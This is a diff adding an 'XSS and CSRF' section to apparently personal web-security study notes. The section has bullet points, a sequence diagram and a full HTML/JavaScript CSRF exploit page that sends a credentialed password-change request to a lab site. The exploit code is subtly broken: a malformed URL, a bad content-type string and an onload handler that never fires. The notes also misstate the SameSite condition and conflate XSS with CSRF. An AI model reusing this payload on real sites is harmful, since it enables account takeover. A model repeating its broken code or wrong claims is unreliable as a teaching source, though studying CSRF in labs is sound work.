@@ -355,3 +355,56 @@ when u see `Access-Control-Allow-Origin: https://attacker.com` and `Access-Contr
 
 > see [this](https://www.youtube.com/watch?v=AUQSYobXbZI) for better view *(part of CORS misconfiguration)*.
 </details>
+
+
+## XSS and CSRF
+- we force client do sth that he dont want, when client authenticated
+- the action should be stat-changing. such as change profile, change password.
+- it should work with `SameSite` cookies
+- it should be simple HTTP request and frequnctable
+
+the flow is like this:
+```mermaid
+sequenceDiagram
+    participant Victim
+    participant "Vulnerable Website"
+    participant "Attacker Website"
+
+    Victim->>"Attacker Website": GET /exploit.html
+    "Attacker Website"->>Victim: Exploit (JS Loaded)
+    Victim->>"Vulnerable Website": POST /change_password
+    "Vulnerable Website"->>Victim: Response (SOP)
+    Note right of "Attacker Website": Exploit
+    Note right of "Vulnerable Website": Done
+```
+
+for example u make a payload that send a request to change password in a specific site look، this is payload for it:
+```js
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>GOODCMS CSRF exploit!</title>
+<script>
+  function runCSRF () {
+  // It changes the password by sending the request to the server // But you cannot view the resulting response because of SOP
+    let request = new XMLHttpRequest();
+    request.onreadystatechange = function () {
+        if (request.readyState == 4 && request.status == 200) {
+            console.log(`[*] Password changed to 'user'`);
+        }
+      }  
+    request.open("POST", "http://good cms. lab: 32225/change_pass");
+    request.setRequestHeader("Content-Type", "application x-www-form-urlencoded");
+    request.withCredentials = true;
+    request.send("password=user&password_repeat=hacked");
+    window.onload = function () {
+    runCSRF ();
+  };
+</script>
+</head>
+<body>
+</body>
+</html>
+```
